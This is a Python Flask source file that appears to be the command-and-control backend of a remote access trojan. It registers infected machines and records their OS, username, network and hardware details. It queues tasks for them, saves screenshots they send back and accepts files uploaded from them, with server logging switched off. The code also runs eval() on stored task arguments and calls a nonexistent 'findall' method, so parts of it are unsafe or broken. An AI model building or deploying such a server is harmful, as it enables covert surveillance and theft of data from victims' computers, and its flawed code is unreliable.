from queueModel import Queue, lock
from dbModel import DB
from flask import Flask, request, make_response
from flask_restful import Resource, Api, reqparse
import sys
import json
from datetime import datetime, timezone
import logging
import werkzeug
from base64 import b64decode
from hashlib import md5

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True
api = Api(app)
db = DB()
queue = Queue(db)
parser = reqparse.RequestParser()
parser.add_argument('machineId', type=str)
parser.add_argument('taskId', type=str)
parser.add_argument('status', type=str)
parser.add_argument('errors', type=str)
parser.add_argument('body', type=str)
parser.add_argument('os', type=str)
parser.add_argument('computerName', type=str)
parser.add_argument('username', type=str)
parser.add_argument('network', type=str)
parser.add_argument('cpu', type=str)
parser.add_argument('ram', type=str)
parser.add_argument(
    'file', type=werkzeug.datastructures.FileStorage, location="files")


class InitEP(Resource):
    def get(self, machine_id):
        lock.acquire(True)
        db.c.execute('SELECT * FROM machines where machineId=?',
                     (machine_id, ))
        result = db.c.fetchone()
        lock.release()
        if result:
            lock.acquire(True)
            db.c.execute('UPDATE machines SET lastConnected=? where machineId=?', (int(
                datetime.now(tz=timezone.utc).timestamp()), machine_id))
            db.conn.commit()
            lock.release()
            resp = make_response(json.dumps(
                {'machineID': machine_id, 'isNew': False}))
            return resp
        else:
            lock.acquire(True)
            db.c.execute('INSERT INTO machines (machineId, lastConnected) VALUES (?, ?)', (machine_id, int(
                datetime.now(tz=timezone.utc).timestamp())))
            db.conn.commit()
            lock.release()
            resp = make_response(json.dumps(
                {'machineId': machine_id, 'isNew': True}))
            return resp


class QueueEP(Resource):
    def get(self, machine_id):
        lock.acquire(True)
        db.c.execute(
            'SELECT * FROM queue WHERE isComplete="false" AND machineId=?', (machine_id, ))
        tasks = db.c.fetchall()
        lock.release()
        result = []
        for i in tasks:
            result.append(
                {'taskId': i[0], 'task': i[1], 'machineId': i[2], 'args': eval(i[3])})
        resp = make_response(json.dumps(result))
        return resp

    def post(self, machine_id):
        args = parser.parse_args()
        task_id = args['taskId']
        if 'ok' in args['status']:
            lock.acquire(True)
            db.c.execute('SELECT task FROM queue where taskID=?', (task_id, ))
            task = db.c.findall()
            lock.release()
            if 'screenshot' in task:
                body = args['body']
                image = b64decode(body)
                image_hash = md5(image).hexdigest()
                image_name = f'{image_hash}.png'
                with open(image_name, 'wb') as fp:
                    fp.write(image)
                print(
                    f"Saved Screenshot from {machine_id}, task {task_id} to {image_name}\n")
            else:
                print(
                    f"Response from {machine_id}, task {task_id} : {repr(args['body'])}\n")
                lock.acquire(True)
                db.c.execute(
                    'UPDATE queue SET isComplete="true" WHERE taskId=?', (task_id, ))
                db.conn.commit()
                lock.release()
            return "ok", 200
        else:
            print(f"Error from {machine_id}, task {task_id}: {args['errors']}")
            return "ok", 200


class NewEP(Resource):
    def post(self, machine_id):
        args = parser.parse_args()
        lock.acquire(True)
        db.c.execute('UPDATE machines SET os=?, computerName=?, username=?, network=?, cpu=?, ram=? where machineId=?',
                     (args['os'], args['computerName'], args['username'], args['network'], args['cpu'], args['ram'], machine_id))
        db.conn.commit()
        lock.release()
        return "ok", 200


class UploadEP(Resource):
    def post(self, machine_id):
        args = parser.parse_args()
        machine_file = args['file']
        machine_file.filename = werkzeug.utils.secure_filename(
            machine_file.filename)
        machine_file.save(machine_file.filename)
        return 'ok', 201


api.add_resource(InitEP, '/shyaam/<string:machine_id>')
api.add_resource(NewEP, '/shyaam/<string:machine_id>/new')
api.add_resource(QueueEP, '/shyaam/<string:machine_id>/queue')
api.add_resource(UploadEP, '/shyaam/<string:machine_id>/upload')


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
